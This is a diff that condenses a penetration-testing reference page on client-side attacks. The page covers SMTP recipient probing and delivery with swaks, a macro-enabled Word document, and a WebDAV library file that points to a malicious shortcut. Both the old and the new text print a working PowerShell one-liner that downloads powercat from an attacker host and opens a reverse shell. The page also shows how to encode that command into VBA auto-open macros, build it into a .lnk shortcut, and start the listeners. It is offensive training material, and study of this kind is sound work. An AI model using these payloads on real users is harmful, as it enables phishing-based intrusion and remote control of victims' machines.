@@ -1,66 +1,73 @@
 # Client-side attacks and phishing delivery
 
-[← Foothold quick reference](../02-foothold.md) · [Mail enumeration](../enum/mail.md) · [Net-NTLM capture](../windows/ntlm-capture.md)
+Related: [Mail enumeration](../enum/mail.md) · [Net-NTLM capture](../windows/ntlm-capture.md)
 
-Use this path when the in-scope workflow includes a person opening a document, shortcut, or mail attachment. Delivery, opening, and code execution are separate checkpoints; an SMTP `250` alone proves none of the latter two.
-
-| Delivery path | Choose it when | Abandon or change course when |
+| Delivery path | Use when | Drop when |
 | --- | --- | --- |
-| Office VBA | Office is installed and a macro-enabled document is likely to be opened. | Internet-origin macros are blocked, policy disables macros, or the attachment is filtered. |
-| WebDAV `.Library-ms` + `.lnk` | A Windows user can open a library file and then a shortcut in its WebDAV location. | WebDAV is unreachable, either file is blocked, or there is no evidence the shortcut was run. |
-| SMTP | You have an accepted recipient and a permitted sender/relay path. | Authentication, recipient policy, or attachment filtering stops delivery. |
-| File-induced NTLM authentication | The goal is a Net-NTLM response, not code execution, and a client can reach your listener. | Outbound SMB/HTTP is blocked or the file is not processed. See [Net-NTLM capture](../windows/ntlm-capture.md). |
+| [Office VBA](#office-vba-document) | Office installed, macro doc likely opened | Internet-origin macros blocked, attachment filtered |
+| [WebDAV `.Library-ms` + `.lnk`](#webdav-library-and-shortcut) | User opens library, then shortcut | WebDAV unreachable, file blocked, no callback |
+| [SMTP](#authenticated-smtp-delivery) | Accepted recipient + permitted sender/relay | Auth, recipient policy or attachment filter stops it |
+| File-induced NTLM auth | Want Net-NTLM response, not code exec | Outbound SMB/HTTP blocked → [Net-NTLM capture](../windows/ntlm-capture.md) |
 
 ## Check the mail path first
-
-Use a valid `EHLO` hostname, then compare recipient replies for a candidate and a deliberately nonexistent address **in the served domain**. `VRFY` may be disabled. `530` means this transaction needs authentication at that point; `550 Unknown user` rejects that recipient; `250` only accepts the recipient for this transaction. If every candidate and the nonsense control return `250`, RCPT probing gives no user-enumeration signal. An external address can get `250` under different relay rules, so it is not evidence that a local mailbox exists.
+Compare a candidate vs a nonexistent address **in the served domain**, with a valid `EHLO` name.
 
 ```bash
-swaks --server <smtp-ip> --port 587 --tls \
-  --from '<sender@domain.tld>' --to '<recipient@domain.tld>' \
+swaks --server <IP> --port 587 --tls \
+  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
+  --quit-after RCPT
+```
+```bash
+# needs auth (530):
+swaks --server <IP> --port 587 --tls \
+  --auth LOGIN --auth-user '<USER>@<DOMAIN.TLD>' \
+  --auth-password --protect-prompt --auth-hide-password \
+  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
   --quit-after RCPT
 ```
 
-If the server requires authentication, add `--auth LOGIN --auth-user '<sender@domain.tld>' --auth-password --protect-prompt --auth-hide-password`. With no password argument, Swaks uses a matching `.netrc` entry if available or prompts; confirm which credential source it used. This keeps the password out of shell history and a process argument. `--quit-after RCPT` sends **no message**. In the transcript, `->` is the client command and `<-` is the server reply.
+| Reply | Meaning |
+| --- | --- |
+| `530` | Needs auth here → retry authenticated, repeat candidate vs control |
+| `550 Unknown user` | Recipient rejected |
+| `250` for candidate **and** nonsense control | No enumeration signal |
+| `250` for external address | Relay rule, not proof of a local mailbox |
 
-If `MAIL FROM` with a local domain produces a different `RCPT TO` result from an external sender, record both transactions: sender/relay policy is configuration-specific. Repeat the candidate and nonsense-control comparison **after** authentication if the unauthenticated path returns `530` for both. Do not turn a single `250` into a claim that the mailbox exists.
+- `--quit-after RCPT` sends no message. `->` = client, `<-` = server: grep `<-` lines.
+- Local vs external `MAIL FROM` can change the `RCPT` result: test both.
 
 ## Authenticated SMTP delivery
-
-Only send to an in-scope recipient. Confirm the attachment type is permitted and the listener is ready. Swaks reads an attachment from disk when its argument starts with `@`.
+Start HTTP server + listener first.
 
 ```bash
-swaks --server <smtp-ip> --port 587 --tls \
-  --auth LOGIN --auth-user '<sender@domain.tld>' \
+swaks --server <IP> --port 587 --tls \
+  --auth LOGIN --auth-user '<USER>@<DOMAIN.TLD>' \
   --auth-password --protect-prompt --auth-hide-password \
-  --from '<sender@domain.tld>' --to '<recipient@domain.tld>' \
+  --from '<USER>@<DOMAIN.TLD>' --to '<RCPT>@<DOMAIN.TLD>' \
   --h-Subject 'Requested document' --body 'Please review the attached file.' \
   --attach @/path/to/allowed-file
 ```
+| Problem | Fix |
+| --- | --- |
+| `535` auth failed | Pass user/pw as plain text; don't pre-base64 them |
+| `MAIL FROM` rejected after auth | Use the authenticated account's own address |
+| No STARTTLS advertised | Drop `--tls` / use the port's real transport (465 = `--tlsc`) |
+| Attachment arrives as literal text | Prefix the path with `@` |
 
-If the server does not advertise STARTTLS, adjust the transport to the service actually offered; do not assume port 587 implies TLS. If Office or executable attachments are filtered, a `.docm` is not a viable mail payload. A final `250` after `DATA` means the server accepted the message, not that it reached the inbox, passed filtering, or was opened. Correlate with a unique callback or an authenticated mailbox read if available.
-
-Pass the username and prompted password as ordinary text; Swaks performs the encoding required by `AUTH LOGIN`. Pre-encoding either value can cause a `535` authentication failure. If authentication works but `MAIL FROM` is rejected, try the address tied to the authenticated account before changing the payload. `--attach @/path/to/file` reads file contents; without `@`, Swaks may attach the literal argument. For a transcript search, inspect server `<-` lines, not the client `->` commands.
+- Final `250` after `DATA` = accepted, not delivered or opened. Confirm via a unique callback.
 
 ## Office VBA document
-
-Encode a tested PowerShell command as UTF-16LE for `-EncodedCommand`. The example uses [Powercat](https://github.com/besimorhino/powercat): place `powercat.ps1` in a dedicated staging directory and serve it with `python3 -m http.server 8000 --directory /path/to/staging`. Use your own callback IP and port.
-
 ```bash
-printf '%s' "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:8000/powercat.ps1');powercat -c <KALI_IP> -p <CALLBACK_PORT> -e powershell" \
-  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
+# serve powercat.ps1 from a staging dir
+python3 -m http.server 8000 --directory /path/to/staging
+nc -lvnp <PORT>
 ```
-
-Long encoded commands need VBA-sized chunks. From the repository root, run the [VBA chunk script](../scripts/vba_chunks.py):
-
 ```bash
-# Paste the Base64 value when prompted; copy the printed VBA lines into RunPayload.
-python3 scripts/vba_chunks.py
+# UTF-16LE base64 for -EncodedCommand, split into VBA lines (run from repo root)
+printf '%s' "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1');powercat -c <KALI> -p <PORT> -e powershell" \
+  | iconv -f UTF-8 -t UTF-16LE | base64 -w0 | python3 scripts/vba_chunks.py
 ```
-
-You can also pipe the encoding command above directly into `python3 scripts/vba_chunks.py` instead of copying the Base64 manually.
-
-In Word, place `RunPayload` and **one** open trigger in a standard module. Paste every generated `cmd = cmd & ...` line where indicated. Save as macro-enabled `.docm` (or legacy `.doc`).
+Standard module; paste the generated `cmd = cmd & "..."` lines; save as `.docm` (or `.doc`):
 
 ```vba
 Public Sub RunPayload()
@@ -74,29 +81,23 @@ Sub AutoOpen()
     RunPayload
 End Sub
 ```
-
-Alternative: instead of `AutoOpen`, put this event in the document's `ThisDocument` module; `RunPayload` remains in the standard module. Do not use both triggers without testing for duplicate execution.
+Alternative trigger, in `ThisDocument` (use one trigger only, or it runs twice):
 
 ```vba
 Private Sub Document_Open()
     RunPayload
 End Sub
 ```
-
-```bash
-python3 -m http.server 8000 --directory /path/to/staging
-nc -lvnp <CALLBACK_PORT>
-```
-
-Start the HTTP server and callback listener before delivery. Test in a controlled Windows/Office environment. Modern Office blocks macros from internet-origin files by default; if that policy is in effect, do not keep retrying an execution path that cannot run.
+- `vba_chunks.py` without a pipe prompts for the Base64. [Script](../scripts/vba_chunks.py)
+- Internet-origin macros are blocked by default: if that policy applies, switch path.
 
 ## WebDAV library and shortcut
-
-Serve a dedicated directory with a shortcut inside it. A `.Library-ms` file points Explorer to that WebDAV location; it does **not** execute the shortcut on its own. The user must open the library and then the `.lnk`.
+User opens `.Library-ms` → Explorer shows the WebDAV dir → user opens `.lnk`.
 
 ```bash
 wsgidav --host=0.0.0.0 --port=80 --root=/path/to/webdav --auth=anonymous
 ```
+`Documents.Library-ms`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -112,31 +113,29 @@ wsgidav --host=0.0.0.0 --port=80 --root=/path/to/webdav --auth=anonymous
     <searchConnectorDescription>
       <isDefaultSaveLocation>true</isDefaultSaveLocation>
       <isSupported>false</isSupported>
-      <simpleLocation><url>http://ATTACKER_IP/</url></simpleLocation>
+      <simpleLocation><url>http://<KALI>/</url></simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
 </libraryDescription>
 ```
-
-Save as `Documents.Library-ms`. On a Windows staging system, create the shortcut and move the resulting `.lnk` into `/path/to/webdav` on the server. Replace the listener and callback values, and keep the Powercat script available on port 8000:
+Build the `.lnk` on a Windows box, copy it into `/path/to/webdav` (powercat on :8000):
 
 ```powershell
-$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:8000/powercat.ps1');powercat -c <KALI_IP> -p <CALLBACK_PORT> -e powershell"
+$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1');powercat -c <KALI> -p <PORT> -e powershell"
 $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\Review.lnk")
 $lnk.TargetPath = 'powershell.exe'
 $lnk.Arguments = '-NoProfile -Command "' + $payload + '"'
 $lnk.Save()
 ```
-
-Verify Explorer can open the library, list the WebDAV directory, and run the shortcut in a controlled test. Deliver the `.Library-ms` through an in-scope mail path or a writable share, for example:
+Deliver the `.Library-ms` by mail or a writable share:
 
 ```text
-smbclient //<TARGET_IP>/<SHARE> -U <USER>
+smbclient //<IP>/<SHARE> -U <USER>
 smb: \> put Documents.Library-ms
 ```
+| Seen | Next |
+| --- | --- |
+| No WebDAV request | Reachability, client blocked the library |
+| WebDAV hit, no callback | `.lnk` not opened, or command/egress blocked |
 
-If the library is opened but there is no WebDAV request, troubleshoot reachability and client handling; if WebDAV is reached but there is no callback, check whether the shortcut was opened and whether its command or egress was blocked. A WebDAV request alone is not code execution.
-
-OAuth/SAML and access-control checks from the source note live on the [web auth page](../web/authentication.md#oauth-oidc-and-saml-flows); they are distinct from phishing delivery.
-
-References: [Swaks reference](https://www.jetmore.org/john/code/swaks/files/swaks-20240103.0/doc/ref.txt) · [Word auto macros](https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros) · [Word `Document.Open`](https://learn.microsoft.com/en-us/office/vba/api/word.document.open) · [Microsoft macro blocking](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked) · [WsgiDAV](https://github.com/mar10/wsgidav).
+OAuth/SAML checks: [web auth page](../web/authentication.md).
